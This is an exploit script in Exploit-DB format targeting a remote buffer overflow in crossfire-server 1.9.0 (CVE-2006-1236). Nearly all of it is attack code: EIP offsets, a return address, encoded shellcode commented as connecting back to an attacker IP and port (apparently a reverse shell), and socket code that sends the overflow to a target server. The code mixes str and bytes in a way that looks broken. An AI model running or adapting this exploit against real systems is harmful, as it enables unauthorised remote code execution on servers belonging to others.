# Exploit Title: crossfire-server 1.9.0 - 'SetUp()' Remote Buffer Overflow
# Exploit Author: Khaled Salem @Khaled0x07
# Software Link: https://www.exploit-db.com/apps/43240af83a4414d2dcc19fff3af31a63-crossfire-1.9.0.tar.gz
# Version: 1.9.0
# Tested on: Kali Linux 2020.4
# CVE : CVE-2006-1236 

#!/bin/python
import socket
import time


# Crash at 4379
# EIP Offset at 4368
# Badchar \x00\x20
# ECX Size 170
# CALL ECX 0x080640eb

size = 4379

# Attacker IP: 127.0.0.1 Port: 443
shellcode =  b""
shellcode += b"\xd9\xee\xd9\x74\x24\xf4\xb8\x60\x61\x5f\x28"
shellcode += b"\x5b\x33\xc9\xb1\x12\x31\x43\x17\x03\x43\x17"
shellcode += b"\x83\xa3\x65\xbd\xdd\x12\xbd\xb6\xfd\x07\x02"
shellcode += b"\x6a\x68\xa5\x0d\x6d\xdc\xcf\xc0\xee\x8e\x56"
shellcode += b"\x6b\xd1\x7d\xe8\xc2\x57\x87\x80\xab\xa7\x77"
shellcode += b"\x51\x3c\xaa\x77\x50\x07\x23\x96\xe2\x11\x64"
shellcode += b"\x08\x51\x6d\x87\x23\xb4\x5c\x08\x61\x5e\x31"
shellcode += b"\x26\xf5\xf6\xa5\x17\xd6\x64\x5f\xe1\xcb\x3a"
shellcode += b"\xcc\x78\xea\x0a\xf9\xb7\x6d"




try:
	filler = "\x90"*(4368 - 170) + shellcode+"\x90"*(170-len(shellcode))
	EIP = "\xeb\x40\x06\x08" 
	padding = "C" * (4379 - len(filler) - len(EIP))
	payload = filler + EIP + padding
	inputBuffer = "\x11(setup sound "+ payload +"\x90\x00#"
	print("Sending Buffer with size:" + str(len(payload)))
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	s.connect(("192.168.1.4",13327)) # Server IP Address: 192.168.1.4
	print(s.recv(1024))

	s.send(inputBuffer)
	s.close()

except:
	print("Could not connect")
	exit(0)
            
